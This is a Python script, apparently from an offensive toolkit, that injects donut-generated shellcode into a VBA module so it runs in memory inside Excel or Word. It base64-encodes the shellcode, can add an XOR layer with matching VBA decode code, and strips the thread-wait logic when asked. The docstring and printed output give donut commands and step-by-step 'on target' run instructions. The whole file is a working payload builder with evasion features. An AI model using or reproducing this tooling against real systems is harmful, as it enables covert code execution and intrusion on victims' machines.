#!/usr/bin/env python3
"""
build_vba_shellcode.py -- Injects raw shellcode into vba_shellcode.bas

Generates a .bas VBA module that:
  - Decodes base64 shellcode via MSXML (no .NET CLR needed)
  - Allocates RW memory, copies shellcode, flips to RX
  - Executes via CreateThread (fire-and-forget with --no-wait for donut -x 3)
  - Runs inside Excel/Word process (Microsoft-signed, no disk writes)

Designed for use with donut-generated shellcode (.NET assembly -> shellcode).

Usage:
  python build_vba_shellcode.py <shellcode.bin>
  python build_vba_shellcode.py <shellcode.bin> --no-wait
  python build_vba_shellcode.py <shellcode.bin> -o output/payload.bas

Generate shellcode with donut (on Linux staging host):
  donut -i Seatbelt.exe -a 2 -b 3 -x 3 -o seatbelt.bin
  python build_vba_shellcode.py seatbelt.bin --no-wait

On target:
  1. Open Excel or Word
  2. Alt+F11 to open VBA editor
  3. File > Import File > payload_ready.bas
  4. F5 to run Auto_Open
"""

import argparse
import base64
import os
import sys

CHUNK_SIZE = 800


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def build_payload_function(b64_payload: str) -> str:
    chunks = [b64_payload[i:i + CHUNK_SIZE] for i in range(0, len(b64_payload), CHUNK_SIZE)]
    lines = []
    for chunk in chunks:
        lines.append(f'    s = s & "{chunk}"')
    return '\n'.join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="Inject raw shellcode into vba_shellcode.bas"
    )
    parser.add_argument("shellcode", help="Path to raw shellcode file (.bin)")
    parser.add_argument("-o", "--output", help="Output .bas file")
    parser.add_argument("--template", help="Template .bas file to use")
    parser.add_argument(
        "-x", "--xor", action="store_true",
        help="Apply XOR encryption layer (decoded in VBA before execution)"
    )
    parser.add_argument("--xor-key", help="XOR key as hex (default: random 16 bytes)")
    parser.add_argument(
        "--no-wait", action="store_true",
        help="Don't wait for shellcode thread (use with donut -x 3)"
    )
    args = parser.parse_args()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "vba_shellcode.bas")
    output_path = args.output or os.path.join(script_dir, "output", "payload_ready.bas")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    if not os.path.exists(args.shellcode):
        print(f"[-] Shellcode not found: {args.shellcode}", file=sys.stderr)
        sys.exit(1)
    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    with open(args.shellcode, "rb") as f:
        sc_bytes = f.read()
    print(f"[*] Shellcode: {args.shellcode} ({len(sc_bytes)} bytes)", file=sys.stderr)

    with open(template_path, "r") as f:
        template = f.read()

    if args.xor:
        if args.xor_key:
            key = bytes.fromhex(args.xor_key)
        else:
            key = os.urandom(16)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)
        sc_bytes = xor_encrypt(sc_bytes, key)
        key_b64 = base64.b64encode(key).decode("ascii")

        xor_decode_block = f'''
    ' XOR decode
    Dim keyElem As Object
    Set keyElem = CreateObject("MSXML2.DOMDocument.3.0").createElement("k")
    keyElem.dataType = "bin.base64"
    keyElem.Text = "{key_b64}"
    Dim xKey() As Byte
    xKey = keyElem.nodeTypedValue
    Dim xi As Long
    For xi = 0 To UBound(scBytes)
        scBytes(xi) = scBytes(xi) Xor xKey(xi Mod (UBound(xKey) + 1))
    Next xi
    Set keyElem = Nothing
'''
        template = template.replace(
            "    ' ALLOC_START",
            xor_decode_block + "\n    ' ALLOC_START"
        )

    if args.no_wait:
        import re
        pattern = re.compile(
            r"^.*' WAIT_START.*$\n(.*?\n)*?^.*' WAIT_END.*$\n?",
            re.MULTILINE
        )
        template = pattern.sub('', template)

    sc_b64 = base64.b64encode(sc_bytes).decode("ascii")
    print(f"[*] Base64 payload: {len(sc_b64)} chars "
          f"({len(sc_b64) // CHUNK_SIZE + 1} VBA chunks)", file=sys.stderr)

    payload_lines = build_payload_function(sc_b64)
    template = template.replace("    ' PAYLOADCHUNKS", payload_lines)

    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    1. Open Excel or Word", file=sys.stderr)
    print(f"    2. Alt+F11 to open VBA editor", file=sys.stderr)
    print(f"    3. File > Import File > {os.path.basename(output_path)}", file=sys.stderr)
    print(f"    4. F5 to run Auto_Open", file=sys.stderr)


if __name__ == "__main__":
    main()
